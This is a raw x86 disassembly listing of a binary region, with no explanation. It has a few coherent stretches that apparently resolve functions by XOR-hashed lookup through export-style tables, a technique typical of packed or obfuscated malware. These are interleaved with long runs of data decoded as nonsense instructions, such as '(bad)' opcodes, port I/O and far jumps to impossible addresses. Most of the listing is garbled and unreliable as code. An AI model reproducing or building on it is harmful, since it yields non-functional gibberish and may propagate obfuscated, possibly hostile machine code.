  40c69a:	lock or DWORD PTR [esi+0x77],0xc54e063
  40c6a2:	add    eax,0xb90a60a8
  40c6a7:	cdq    
  40c6a8:	es mov dh,0x9
  40c6ab:	xor    al,0x97
  40c6ad:	jmp    0x40c66b
  40c6af:	ret    0x9283
  40c6b2:	dec    ebp
  40c6b3:	dec    ecx
  40c6b4:	sar    BYTE PTR [ebx],cl
  40c6b6:	sbb    al,0xa2
  40c6b8:	push   esp
  40c6b9:	in     al,dx
  40c6ba:	mov    ebx,0xe34374d0
  40c6bf:	xchg   edx,eax
  40c6c0:	fs push eax
  40c6c2:	scas   eax,DWORD PTR es:[edi]
  40c6c3:	ss sti 
  40c6c5:	ret    
  40c6c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6c7:	es (bad) 
  40c6c9:	cmp    al,0x61
  40c6cb:	mov    cl,ch
  40c6cd:	mov    bl,0x8b
  40c6cf:	dec    ebp
  40c6d0:	clc    
  40c6d1:	xor    eax,0x7510856
  40c6d6:	add    eax,ebx
  40c6d8:	cmp    ecx,eax
  40c6da:	jne    0x40c6fd
  40c6e0:	mov    eax,DWORD PTR [ebp-0x20]
  40c6e3:	inc    edi
  40c6e4:	cmp    edi,eax
  40c6e6:	jb     0x40b937
  40c6ec:	jmp    0x40c70d
  40c6f1:	mov    eax,DWORD PTR [ebp-0x4]
  40c6f4:	xor    eax,esi
  40c6f6:	add    eax,ebx
  40c6f8:	jmp    0x40e0f7
  40c6fd:	mov    eax,DWORD PTR [ebp-0x2c]
  40c700:	movzx  eax,WORD PTR [eax+edi*2]
  40c704:	mov    ecx,DWORD PTR [ebp-0x14]
  40c707:	mov    eax,DWORD PTR [ecx+eax*4]
  40c70a:	mov    DWORD PTR [ebp+0xc],eax
  40c70d:	mov    eax,DWORD PTR [ebp-0x4]
  40c710:	mov    ecx,DWORD PTR [ebp-0x8]
  40c713:	xor    eax,0x7510856
  40c718:	add    eax,ebx
  40c71a:	cmp    ecx,eax
  40c71c:	jne    0x40c88d
  40c722:	mov    eax,DWORD PTR [ebp-0x4]
  40c725:	xor    eax,0x7510856
  40c72a:	jmp    0x40c6f6
  40c72f:	jmp    0x40c88d
  40c734:	pop    eax
  40c735:	mov    WORD PTR ds:0x5da1fd90,?
  40c73b:	jl     0x40c715
  40c73d:	xchg   ecx,eax
  40c73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c740:	ja     0x40c73b
  40c742:	(bad)  
  40c743:	fnstenv [esi]
  40c745:	bnd jle 0x40c7c6
  40c748:	aas    
  40c749:	jg     0x40c7c9
  40c74b:	jle    0x40c75f
  40c74d:	in     al,0x23
  40c74f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c750:	or     BYTE PTR [ecx-0x64],dl
  40c753:	test   BYTE PTR [eax-0x5b],cl
  40c756:	rcl    BYTE PTR [esi+0x5706a369],0x88
  40c75d:	ins    DWORD PTR es:[edi],dx
  40c75e:	aam    0x58
  40c760:	cmp    al,dh
  40c762:	pop    ebp
  40c763:	jb     0x40c759
  40c765:	das    
  40c766:	push   ds
  40c767:	or     eax,0x42c55805
  40c76c:	sti    
  40c76d:	mov    ebx,ds
  40c76f:	enter  0x6e09,0x2f
  40c773:	push   esi
  40c774:	xchg   esi,eax
  40c775:	fwait
  40c776:	or     DWORD PTR [edx+0x65518e33],esi
  40c77c:	push   ds
  40c77d:	inc    eax
  40c77e:	and    DWORD PTR [edx+0x14],ebx
  40c781:	inc    esi
  40c782:	jge    0x40c731
  40c784:	mov    ch,0x20
  40c786:	and    BYTE PTR [esi],dl
  40c788:	ins    DWORD PTR es:[edi],dx
  40c789:	test   BYTE PTR [edi-0xb3fe136],0xb9
  40c790:	dec    ebx
  40c791:	xor    eax,0x47671f89
  40c796:	fisubr DWORD PTR [ecx+0x8b28f6d]
  40c79c:	adc    eax,DWORD PTR [edx-0x44]
  40c79f:	xor    edx,DWORD PTR [ecx]
  40c7a1:	inc    esp
  40c7a2:	stc    
  40c7a3:	sub    al,0xc1
  40c7a5:	outs   dx,DWORD PTR ds:[esi]
  40c7a6:	sub    cl,BYTE PTR [ecx]
  40c7a8:	jmp    0x40c752
  40c7aa:	cmp    al,cl
  40c7ac:	mov    esp,0x8881d574
  40c7b1:	imul   esp,eax,0x364ebe2d
  40c7b7:	lods   al,BYTE PTR ds:[esi]
  40c7b8:	das    
  40c7b9:	mov    ebp,0x85884106
  40c7be:	inc    edx
  40c7bf:	add    al,0x10
  40c7c1:	inc    ch
  40c7c3:	inc    esi
  40c7c4:	loope  0x40c83f
  40c7c6:	or     ah,BYTE PTR [edx+0x52]
  40c7c9:	jle    0x40c76f
  40c7cb:	mov    ebp,0x217bbf3d
  40c7d0:	push   edi
  40c7d1:	mov    ecx,0x1e2c1613
  40c7d6:	das    
  40c7d7:	xchg   edx,eax
  40c7d8:	daa    
  40c7d9:	mov    edx,0x6c602e71
  40c7de:	pop    ecx
  40c7df:	inc    ebx
  40c7e0:	adc    BYTE PTR [ebp-0x97e1403],dl
  40c7e6:	fs push ecx
  40c7e8:	aas    
  40c7e9:	test   DWORD PTR [edi],ebx
  40c7eb:	mov    ecx,0x3ab3f39
  40c7f0:	adc    BYTE PTR [edx],0x2d
  40c7f3:	or     BYTE PTR [edi-0x23],0x75
  40c7f7:	mov    ss,WORD PTR [ebp-0x18ad4dbd]
  40c7fd:	jl     0x40c7d3
  40c7ff:	and    BYTE PTR [edi+0x7],dl
  40c802:	stc    
  40c803:	pop    ss
  40c804:	jmp    0x8160:0x84e421f4
  40c80b:	enter  0x12c7,0xcb
  40c80f:	lds    ebp,FWORD PTR [esi-0x36]
  40c812:	sahf   
  40c813:	or     BYTE PTR [eax],dh
  40c815:	loopne 0x40c852
  40c817:	test   BYTE PTR [edx],al
  40c819:	and    DWORD PTR [ecx+0xa],edx
  40c81c:	js     0x40c896
  40c81e:	and    edx,DWORD PTR [edx]
  40c820:	fnsave [esi]
  40c822:	aad    0x89
  40c824:	stos   BYTE PTR es:[edi],al
  40c825:	bound  esi,QWORD PTR [ecx+0x4c360f21]
  40c82b:	or     DWORD PTR [esi],0xef2c68a1
  40c831:	popw   ds
  40c833:	out    0x45,eax
  40c835:	das    
  40c836:	push   es
  40c837:	sbb    DWORD PTR [edx],0xaadbd2de
  40c83d:	enter  0xec54,0x14
  40c841:	cmp    al,0x42
  40c843:	xchg   ebx,eax
  40c844:	sahf   
  40c845:	enter  0xfe22,0x90
  40c849:	inc    eax
  40c84a:	cdq    
  40c84b:	std    
  40c84c:	les    ecx,FWORD PTR [edx-0x57]
  40c84f:	mov    bh,0x47
  40c851:	inc    edi
  40c852:	pusha  
  40c853:	xchg   edi,eax
  40c854:	pop    ecx
  40c855:	cmp    ebp,0xffffffa6
  40c858:	iret   
  40c859:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c85a:	mov    ds:0x11009a41,al
  40c85f:	es adc eax,DWORD PTR gs:[edx]
  40c863:	pop    edx
  40c864:	and    esi,ebp
  40c866:	mov    dl,BYTE PTR [ecx-0x76c1e458]
  40c86c:	xor    eax,0xc7fe13d8
  40c871:	lods   al,BYTE PTR ds:[esi]
  40c872:	jecxz  0x40c8a5
  40c874:	sbb    DWORD PTR [eax],0x3cc7cecd
  40c87a:	inc    edx
  40c87b:	jns    0x40c8d4
  40c87d:	and    edx,DWORD PTR [edx+0x30c35681]
  40c883:	out    0xbc,al
  40c885:	xchg   DWORD PTR [esi+esi*1-0x62],ebx
  40c889:	fxch   st(6)
  40c88b:	jae    0x40c891
  40c88d:	mov    eax,DWORD PTR [ebp+0xc]
  40c890:	add    eax,DWORD PTR [ebp+0x8]
  40c893:	mov    DWORD PTR [ebp-0x10],eax
  40c896:	mov    eax,DWORD PTR [ebp-0x1c]
  40c899:	test   eax,eax
  40c89b:	je     0x40d717
  40c8a1:	mov    DWORD PTR [ebp-0x24],esi
  40c8a4:	push   0xb
  40c8a6:	pop    ecx
  40c8a7:	push   0x5
  40c8a9:	jmp    0x40ca07
  40c8ae:	stos   DWORD PTR es:[edi],eax
  40c8af:	xchg   DWORD PTR [eax-0x42c643da],ecx
  40c8b5:	fwait
  40c8b6:	adc    bh,bl
  40c8b8:	hlt    
  40c8b9:	call   0xf3f7:0x2e9dd1e4
  40c8c0:	jle    0x40c940
  40c8c2:	aas    
  40c8c3:	jg     0x40c943
  40c8c5:	jle    0x40c903
  40c8c7:	hlt    
  40c8c8:	xchg   DWORD PTR [ebp+0x25e6f74f],edx
  40c8ce:	es ins BYTE PTR es:[edi],dx
  40c8d0:	mov    esi,0xdd9072d0
  40c8d5:	mov    bh,0xa3
  40c8d7:	and    DWORD PTR [ebx+0x723d0263],0xae276e5b
  40c8e1:	sub    esi,DWORD PTR [edx]
  40c8e3:	xor    ah,BYTE PTR [edi]
  40c8e5:	arpl   WORD PTR [ebp-0x6eb867eb],sp
  40c8eb:	sbb    ebp,DWORD PTR [edi+0x7e]
  40c8ee:	jns    0x40c8e8
  40c8f0:	push   eax
  40c8f1:	stos   BYTE PTR es:[edi],al
  40c8f2:	jecxz  0x40c89f
  40c8f4:	pop    ds
  40c8f5:	push   ecx
  40c8f6:	push   0xffffffe0
  40c8f8:	mov    bl,0x14
  40c8fa:	add    ebx,0x6c
  40c8fd:	out    dx,al
  40c8fe:	mov    es,WORD PTR [esi+0x4770d709]
  40c904:	inc    esi
  40c905:	cs sub eax,0x6955fcac
  40c90b:	pop    es
  40c90c:	cmp    DWORD PTR [esi+0x4707b333],ebp
  40c912:	fs pop edi
  40c914:	aam    0x90
  40c916:	adc    al,0xef
  40c918:	fmul   DWORD PTR [edx+eiz*1]
  40c91b:	push   cs
  40c91c:	mov    dl,0xc0
  40c91e:	xchg   ebx,eax
  40c91f:	test   al,0x62
  40c921:	push   ds
  40c922:	faddp  st(7),st
  40c924:	in     al,dx
  40c925:	dec    edx
  40c926:	test   BYTE PTR [edx-0x1f],0xcc
  40c92a:	mov    dl,0x2d
  40c92c:	das    
  40c92d:	pop    edx
  40c92e:	jbe    0x40c90e
  40c930:	repnz fld QWORD PTR [edx+0x5f]
  40c934:	push   0x4a
  40c936:	mov    esp,0x97bd495
  40c93b:	popf   
  40c93c:	repz rcr al,1
  40c93f:	std    
  40c940:	leave  
  40c941:	ss cmp al,0xf1
  40c944:	(bad)
  40c947:	adc    BYTE PTR [eax-0x3e],bh
  40c94a:	push   DWORD PTR [edx+0x53b13691]
  40c950:	out    dx,al
  40c951:	ror    DWORD PTR ds:0x166dedfb,cl
  40c957:	sub    cl,BYTE PTR [esi]
  40c959:	jmp    0x10f0e9e8
  40c95e:	or     al,0x2d
  40c960:	in     eax,0xca
  40c962:	je     0x40c9dd
  40c964:	outs   dx,BYTE PTR ds:[esi]
  40c965:	data16 daa 
  40c967:	loope  0x40c954
  40c969:	outs   dx,DWORD PTR cs:[esi]
  40c96b:	outs   dx,BYTE PTR ds:[esi]
  40c96c:	js     0x40c9c7
  40c96e:	in     eax,0x3
  40c970:	das    
  40c971:	int3   
  40c972:	fwait
  40c973:	mov    esp,0x852c9bbd
  40c978:	(bad)  
  40c979:	(bad)  
  40c97b:	inc    ecx
  40c97c:	sahf   
  40c97d:	sbb    dl,dl
  40c97f:	and    al,0x65
  40c981:	jmp    0x40c983
  40c983:	out    dx,al
  40c984:	xchg   ebx,eax
  40c985:	xchg   esi,eax
  40c986:	rcr    DWORD PTR [ebx+0x70c1d90],1
  40c98c:	daa    
  40c98d:	out    dx,al
  40c98e:	sti    
  40c98f:	fs out dx,al
  40c991:	xor    ah,bl
  40c993:	outs   dx,BYTE PTR ds:[esi]
  40c994:	sbb    al,0x8
  40c996:	jbe    0x40ca0e
  40c998:	sub    BYTE PTR [esi+0x70],bl
  40c99b:	imul   esp,DWORD PTR [eax+0xceedb3c],0xa135bf50
  40c9a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9a6:	iret   
  40c9a7:	or     eax,0xe3b4e5a5
  40c9ac:	mov    ebp,0x59d65c5f
  40c9b1:	sti    
  40c9b2:	pop    ds
  40c9b3:	lods   al,BYTE PTR ds:[esi]
  40c9b4:	xchg   esi,eax
  40c9b5:	pop    ss
  40c9b6:	mov    dh,0x94
  40c9b8:	push   esp
  40c9b9:	pop    ebx
  40c9ba:	sbb    eax,0x6463c7d4
  40c9bf:	pop    ebp
  40c9c0:	mov    ds:0x4e50bdf,al
  40c9c5:	iret   
  40c9c6:	shl    BYTE PTR [ebp+0x791e787e],1
  40c9cc:	(bad)  
  40c9cd:	cdq    
  40c9ce:	dec    eax
  40c9cf:	daa    
  40c9d0:	es pop esp
  40c9d2:	mov    cl,BYTE PTR [ebp-0x63]
  40c9d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9d6:	xlat   BYTE PTR ds:[ebx]
  40c9d7:	mov    eax,0xc0bba39b
  40c9dc:	push   0xffffffee
  40c9de:	aas    
  40c9df:	les    ebx,FWORD PTR ds:0x11fb9253
  40c9e5:	out    0x51,eax
  40c9e7:	cmp    al,0x9a
  40c9e9:	and    dl,bh
  40c9eb:	(bad)  
  40c9ef:	xor    cl,bh
  40c9f1:	sti    
  40c9f2:	dec    ebp
  40c9f3:	repz iret 
  40c9f5:	scas   eax,DWORD PTR es:[edi]
  40c9f6:	xor    ah,BYTE PTR [esp+ebp*1]
  40c9f9:	xchg   edi,eax
  40c9fa:	inc    edx
  40c9fb:	fscale 
  40c9fd:	aas    
  40c9fe:	push   ss
  40c9ff:	cwde   
  40ca00:	cli    
  40ca01:	inc    ecx
  40ca02:	mov    DWORD PTR [eax+0x4928a0f2],ecx
  40ca08:	jmp    0x40cb66
  40ca0d:	and    DWORD PTR [esi+eax*2+0x65fd5b1b],edx
  40ca14:	lods   al,BYTE PTR ds:[esi]
  40ca15:	retf   
  40ca16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca17:	sub    eax,0x9fefa3cf
  40ca1c:	push   esi
  40ca1d:	dec    eax
  40ca1e:	hlt    
  40ca1f:	jle    0x40ca9f
  40ca21:	aas    
  40ca22:	jg     0x40caa2
  40ca24:	jle    0x40ca62
  40ca26:	jns    0x40ca29
  40ca28:	retf   
  40ca29:	imul   ecx,DWORD PTR fs:[esi+0x4fe77f26],0x12ea0f99
  40ca34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca35:	mov    bh,0x3f
  40ca37:	xchg   eax,edi
  40ca39:	add    eax,DWORD PTR [ecx+ecx*8]
  40ca3c:	jo     0x40cabb
  40ca3e:	repnz or eax,0xcd0f0f69
  40ca44:	pop    ebx
  40ca45:	mov    ds:0xb147753a,eax
  40ca4a:	scas   eax,DWORD PTR es:[edi]
  40ca4b:	inc    esi
  40ca4c:	xor    BYTE PTR [edi],0x66
  40ca4f:	test   BYTE PTR [ebp-0x64],ch
  40ca52:	xchg   edi,eax
  40ca53:	fimul  WORD PTR [edx-0x5a]
  40ca56:	js     0x40ca9c
  40ca58:	cmp    eax,0x2d957cd7
  40ca5d:	mov    ebp,0xf4543174
  40ca62:	jne    0x40c9e9
  40ca64:	rol    cl,1
  40ca66:	mov    edi,0x2c9dcdb8
  40ca6b:	or     DWORD PTR [edx+0x4],ebx
  40ca6e:	pushf  
  40ca6f:	dec    ebx
  40ca70:	dec    edi
  40ca71:	add    DWORD PTR [ebx+0x45],ebp
  40ca74:	mov    es,WORD PTR [ecx-0x76]
  40ca77:	cmp    esi,0xffffffc0
  40ca7a:	jae    0x40ca37
  40ca7c:	shl    BYTE PTR [eax-0x57],1
  40ca7f:	js     0x40cac8
  40ca81:	lods   al,BYTE PTR ds:[esi]
  40ca82:	or     al,0x33
  40ca84:	out    0xb7,al
  40ca86:	mov    dl,bh
  40ca88:	dec    ebx
  40ca89:	xchg   esp,eax
  40ca8a:	in     al,0x90
  40ca8c:	xor    DWORD PTR [edi],edx
  40ca8e:	sub    edx,esp
  40ca90:	js     0x40caac
  40ca92:	test   bh,ah
  40ca94:	jae    0x40ca8f
  40ca96:	sub    eax,0xc346f1b9
  40ca9b:	je     0x40cab3
  40ca9d:	inc    edi
  40ca9e:	sahf   
  40ca9f:	and    cl,ah
  40caa1:	(bad)  
  40caa2:	in     al,0xb2
  40caa4:	pop    eax
  40caa5:	add    cl,ch
  40caa7:	scas   al,BYTE PTR es:[edi]
  40caa8:	inc    esi
  40caa9:	nop
  40caaa:	popa   
  40caab:	stos   DWORD PTR es:[edi],eax
  40caac:	fnstenv [eax+ebp*1+0xe2e7b91]
  40cab3:	nop
  40cab4:	jnp    0x40cacd
  40cab6:	cmc    
  40cab7:	push   esp
  40cab8:	jbe    0x40ca8d
  40caba:	out    dx,al
  40cabb:	imul   esp,DWORD PTR [ebx],0x65d47e5d
  40cac1:	imul   eax,DWORD PTR [ecx],0xcf0ad452
  40cac7:	cs mov esi,0x8804ddb6
  40cacd:	(bad)  
  40cace:	xlat   BYTE PTR ds:[ebx]
  40cacf:	(bad)  [edx+0x49]
  40cad2:	adc    BYTE PTR [esi],0x6d
  40cad5:	cmp    DWORD PTR [ecx-0x172f1fa9],edx
  40cadb:	inc    esi
  40cadc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cadd:	cwde   
  40cade:	add    al,0xac
  40cae0:	int    0x2b
  40cae2:	mov    WORD PTR [edi],ss
  40cae4:	lahf   
  40cae5:	pop    edi
  40cae6:	movq   mm4,QWORD PTR [eax-0x5ffbd5d9]
  40caed:	repz inc edi
  40caef:	adc    al,0xf7
  40caf1:	std    
  40caf2:	outs   dx,BYTE PTR ds:[esi]
  40caf3:	out    0x6,eax
  40caf5:	adc    dh,0x6a
  40caf8:	jne    0x40ca80
  40cafa:	outs   dx,BYTE PTR ds:[esi]
  40cafb:	stos   BYTE PTR es:[edi],al
  40cafc:	mov    bl,BYTE PTR fs:[eax+0x3b]
  40cb00:	mov    ch,0x99
  40cb02:	sbb    bh,dh
  40cb04:	cmp    DWORD PTR [ebx-0x6bac3fbc],edx
  40cb0a:	test   dl,ah
  40cb0c:	imul   ebp,DWORD PTR [esp+edx*4-0x13c49bde],0xffffff89
  40cb14:	test   al,0xe3
  40cb16:	push   ebx
  40cb17:	out    dx,eax
  40cb18:	push   es
  40cb19:	sub    al,BYTE PTR [edx]
  40cb1b:	sbb    BYTE PTR [ecx+edi*2-0x34],0x7
  40cb20:	(bad)
  40cb24:	imul   esi,DWORD PTR [ebp-0x739487a6],0x8df701b8
  40cb2e:	sub    eax,0x4e55ca53
  40cb33:	xabort 0xc6
  40cb36:	push   ebx
  40cb37:	int3   
  40cb38:	sbb    eax,0xd7fbccde
  40cb3d:	pop    es
  40cb3e:	mov    WORD PTR [esi+edi*1],ss
  40cb41:	mov    esi,0x4b9c2768
  40cb46:	mov    eax,DWORD PTR [edx-0x19a051d6]
  40cb4c:	xor    al,0xce
  40cb4e:	dec    ebp
  40cb4f:	mov    eax,ds:0xecb4834c
  40cb54:	loope  0x40cb93
  40cb56:	cmp    al,0xb7
  40cb58:	iret   
  40cb59:	inc    ecx
  40cb5a:	xchg   esi,eax
  40cb5b:	popf   
  40cb5c:	inc    esp
  40cb5d:	js     0x40cb89
  40cb5f:	(bad)  
  40cb60:	xlat   BYTE PTR ds:[ebx]
  40cb61:	sbb    eax,0x390cac2b
  40cb66:	pop    ebx
  40cb67:	xchg   ebx,ecx
  40cb69:	sub    ebx,ecx
  40cb6b:	xchg   ebx,ecx
  40cb6d:	dec    ecx
  40cb6e:	mov    eax,DWORD PTR [ebp-0x1c]
  40cb71:	imul   eax,ecx
  40cb74:	sub    esp,eax
  40cb76:	mov    DWORD PTR [ebp-0x24],esp
  40cb79:	jmp    0x40ccd7
  40cb7e:	jp     0x40cb94
  40cb80:	rcr    eax,0x59
  40cb83:	std    
  40cb84:	jnp    0x40cb1a
  40cb86:	mov    BYTE PTR [ebp-0x29],ch
  40cb89:	jl     0x40cbc6
  40cb8b:	fiadd  WORD PTR [edx-0x4c]
  40cb8e:	or     esi,esi
  40cb90:	jle    0x40cc10
  40cb92:	aas    
  40cb93:	jg     0x40cc13
  40cb95:	jle    0x40cc0a
  40cb97:	add    edi,DWORD PTR [edi+edx*1]
  40cb9a:	ins    DWORD PTR es:[edi],dx
  40cb9b:	scas   eax,DWORD PTR es:[edi]
  40cb9c:	adc    edi,DWORD PTR [edi+ecx*4-0x72]
  40cba0:	arpl   WORD PTR [ebp+0x9],si
  40cba3:	xchg   ebp,eax
  40cba4:	ret    
  40cba5:	stos   BYTE PTR es:[edi],al
  40cba6:	xchg   ecx,eax
  40cba7:	xchg   esp,eax
  40cba8:	(bad)  
  40cba9:	push   ss
  40cbaa:	pushf  
  40cbab:	call   0xb16e415e
  40cbb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbb1:	ins    DWORD PTR es:[edi],dx
  40cbb2:	test   esp,esi
  40cbb4:	jmp    0x40cb71
  40cbb6:	fs adc al,0xc
  40cbb9:	js     0x40cbbc
  40cbbb:	or     ah,BYTE PTR [eax+0x12]
  40cbbe:	mov    dh,0x97
  40cbc0:	das    
  40cbc1:	push   esp
  40cbc2:	mov    ebp,0x520456af
  40cbc7:	add    al,0x26
  40cbc9:	out    0x2,al
  40cbcb:	aas    
  40cbcc:	fimul  DWORD PTR [edx-0x62]
  40cbcf:	mov    BYTE PTR [eax-0x258ffdcf],bl
  40cbd5:	cmp    eax,ebp
  40cbd7:	or     al,0xe5
  40cbd9:	pop    ecx
  40cbda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbdb:	cmc    
  40cbdc:	dec    ebp
  40cbdd:	shl    BYTE PTR [ebx+0x54],cl
  40cbe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbe1:	popa   
  40cbe2:	outs   dx,BYTE PTR ds:[esi]
  40cbe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbe4:	or     al,0x6a
  40cbe6:	jle    0x40cb8e
  40cbe8:	(bad)  
  40cbea:	push   edx
  40cbeb:	push   esi
  40cbec:	test   eax,0x30ac6c3a
  40cbf1:	fimul  DWORD PTR [ebp+0x24]
  40cbf4:	aad    0x17
  40cbf6:	or     eax,0x954093f0
  40cbfb:	xchg   esp,eax
  40cbfc:	daa    
  40cbfd:	je     0x40cc41
  40cbff:	daa    
  40cc00:	xor    eax,0x1bb7e168
  40cc05:	sbb    dh,al
  40cc07:	and    eax,0x2ca12e4f
  40cc0c:	jl     0x40cba9
  40cc0e:	sbb    eax,0x3c8941a6
  40cc13:	ficom  DWORD PTR [ecx]
  40cc15:	lds    esi,FWORD PTR [edi]
  40cc17:	rcr    dl,cl
  40cc19:	xor    BYTE PTR [eax+0x63c0fea],ah
  40cc1f:	outs   dx,DWORD PTR ds:[esi]
  40cc20:	cld    
  40cc21:	inc    esi
  40cc22:	inc    esp
  40cc23:	push   ss
  40cc24:	mov    ds:0x6f9a6aa1,eax
  40cc29:	mov    eax,0x82af0b8d
  40cc2e:	pop    ss
  40cc2f:	xchg   edi,eax
  40cc30:	mov    DWORD PTR [edx+ebx*2+0x60],ecx
  40cc34:	test   DWORD PTR [edi],0x61967ef2
  40cc3a:	mov    ebp,0xca3b78ab
  40cc3f:	and    BYTE PTR [esi],ch
  40cc41:	loopne 0x40cbd8
  40cc43:	pop    ebx
  40cc44:	int3   
  40cc45:	gs iret 
  40cc47:	xchg   esi,eax
  40cc48:	out    0x77,al
  40cc4a:	adc    esp,DWORD PTR [edx+0x2d]
  40cc4d:	push   ds
  40cc4e:	cmp    esp,ebx
  40cc50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc51:	add    esi,DWORD PTR [esi-0x39]
  40cc54:	aad    0xe0
  40cc56:	inc    ebp
  40cc57:	or     eax,0xd9014ad1
  40cc5c:	jle    0x40ccaf
  40cc5e:	rol    DWORD PTR [edi-0x9cce26],0x6d
  40cc65:	xor    eax,0x46580fee
  40cc6a:	sbb    esi,DWORD PTR [ebp+0x2f]
  40cc6d:	push   es
  40cc6e:	xchg   ebp,eax
  40cc6f:	popf   
  40cc70:	int3   
  40cc71:	push   es
  40cc72:	mov    ds:0xf38163ef,eax
  40cc77:	addr16 jmp 0x8d8c1f0f
  40cc7d:	add    eax,0x3d9fe49e
  40cc82:	mov    eax,0xc6abf86
  40cc87:	xor    ebx,edi
  40cc89:	mov    esi,0xef344bb7
  40cc8e:	push   ss
  40cc8f:	cdq    
  40cc90:	imul   esp,DWORD PTR [esi],0x4e
  40cc93:	mov    es,edi
  40cc95:	stos   BYTE PTR es:[edi],al
  40cc96:	test   al,0x52
  40cc98:	add    DWORD PTR [ebp+0x4e],ecx
  40cc9b:	lea    edi,[ecx+0x4c]
  40cc9e:	imul   ecx,DWORD PTR [ebp-0x6f],0xffffffad
  40cca2:	add    edi,ebx
  40cca4:	xchg   esp,eax
  40cca5:	hlt    
  40cca6:	cli    
  40cca7:	repnz push edi
  40cca9:	pop    ebp
  40ccaa:	iret   
  40ccab:	mov    ds:0x4fb45c0d,al
  40ccb0:	das    
  40ccb1:	sbb    dl,BYTE PTR [ecx]
  40ccb3:	int    0x40
  40ccb5:	mov    dh,0x4b
  40ccb7:	in     al,0x26
  40ccb9:	or     ecx,ecx
  40ccbb:	or     ecx,DWORD PTR [eax+ebp*2]
  40ccbe:	push   esp
  40ccbf:	daa    
  40ccc0:	or     esp,ebx
  40ccc2:	popa   
  40ccc3:	dec    esp
  40ccc4:	popf   
  40ccc5:	sbb    DWORD PTR ds:0x525f2f0a,esp
  40cccb:	mov    BYTE PTR [eax+0xb41cbd5],bh
  40ccd1:	(bad)  
  40ccd2:	fcom   QWORD PTR [eax-0x68]
  40ccd5:	outs   dx,DWORD PTR ds:[esi]
  40ccd6:	push   es
  40ccd7:	mov    eax,DWORD PTR [ebp-0x4]
  40ccda:	mov    ecx,0x7510856
  40ccdf:	jmp    0x40ce3d
  40cce4:	test   DWORD PTR [ebx+0x4e],esi
  40cce7:	test   al,0x40
  40cce9:	jge    0x40cd68
  40cceb:	cmp    edi,DWORD PTR ds:0xc3ec1d3a
  40ccf1:	dec    ecx
  40ccf2:	push   0x7ef7ca75
  40ccf7:	jle    0x40cd38
  40ccf9:	jg     0x40cd79
  40ccfb:	jle    0x40cd40
  40ccfd:	mov    DWORD PTR [eax],edi
  40ccff:	repnz xchg esi,eax
  40cd01:	mov    BYTE PTR [ebx+ebp*1],ah
  40cd04:	into   
  40cd05:	push   ebp
  40cd06:	inc    ecx
  40cd07:	jmp    0x40cca3
  40cd09:	xor    esi,edx
  40cd0b:	cmp    BYTE PTR [esi-0x1f122650],dl
  40cd11:	and    edx,eax
  40cd13:	mov    WORD PTR [ecx+eiz*2+0x4b],?
  40cd17:	stos   DWORD PTR es:[edi],eax
  40cd18:	or     al,0x43
  40cd1a:	(bad)  
  40cd1b:	mov    eax,ds:0x515a3f87
  40cd20:	jbe    0x40cceb
  40cd22:	pop    edi
  40cd23:	lock xchg ecx,eax
  40cd25:	inc    esi
  40cd26:	ror    DWORD PTR [edx],cl
  40cd28:	addr16 push cs
  40cd2a:	(bad)  
  40cd2b:	fwait
  40cd2c:	and    eax,0xc220f925
  40cd31:	cmc    
  40cd32:	retf   0x79e4
  40cd35:	and    ch,BYTE PTR [esi]
  40cd37:	and    dh,al
  40cd39:	cmp    ah,BYTE PTR [eax]
  40cd3b:	rol    BYTE PTR [ebx],cl
  40cd3d:	xchg   esi,eax
  40cd3e:	ins    DWORD PTR es:[edi],dx
  40cd3f:	hlt    
  40cd40:	icebp  
  40cd41:	sbb    BYTE PTR [ecx-0x50],cl
  40cd44:	addr16 jo 0x40cd55
  40cd47:	adc    cl,BYTE PTR [ebp+0x24]
  40cd4a:	lock call 0xdc1f:0x41134d4e
  40cd52:	aas    
  40cd53:	icebp  
  40cd54:	lds    ebx,FWORD PTR [esi]
  40cd56:	mov    bl,0x4a
  40cd58:	xor    eax,0x783a5ef0
  40cd5d:	mov    dh,0x99
  40cd5f:	inc    eax
  40cd60:	gs inc ebp
  40cd62:	in     al,0x67
  40cd64:	pop    edi
  40cd65:	dec    ecx
  40cd66:	loop   0x40cd13
  40cd68:	into   
  40cd69:	loopne 0x40cd31
  40cd6b:	push   ds
  40cd6c:	xchg   ebx,eax
  40cd6d:	fdivr  DWORD PTR [edx+0x78a9504c]
  40cd73:	push   ebp
  40cd74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd75:	sub    dh,cl
  40cd77:	or     al,0xa9
  40cd79:	mov    dl,0x13
  40cd7b:	xor    al,0xfd
  40cd7d:	(bad)  
  40cd7e:	mov    ch,0x16
  40cd80:	pop    esi
  40cd81:	adc    DWORD PTR [esi+0x31],esi
  40cd84:	ret    0xf3e7
  40cd87:	mov    ds:0x16843e60,eax
  40cd8c:	xor    bh,bh
  40cd8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd8f:	jnp    0x40cd9f
  40cd91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd92:	sbb    edi,ebx
  40cd94:	adc    al,0x55
  40cd96:	pop    esi
  40cd97:	pop    ebx
  40cd98:	xchg   ecx,eax
  40cd99:	mov    ds:0xd53569ad,eax
  40cd9e:	retf   0x2d6c
  40cda1:	mov    ?,WORD PTR [edx]
  40cda3:	fcomp  st(1)
  40cda5:	and    esp,ebp
  40cda7:	inc    edx
  40cda8:	jo     0x40cd30
  40cdaa:	ficomp WORD PTR [edx+edx*8+0x620ca15]
  40cdb1:	(bad)  
  40cdb2:	aad    0x9f
  40cdb4:	fwait
  40cdb5:	push   0x6a3508f9
  40cdba:	jb     0x40cd41
  40cdbc:	cld    
  40cdbd:	repnz and edx,edi
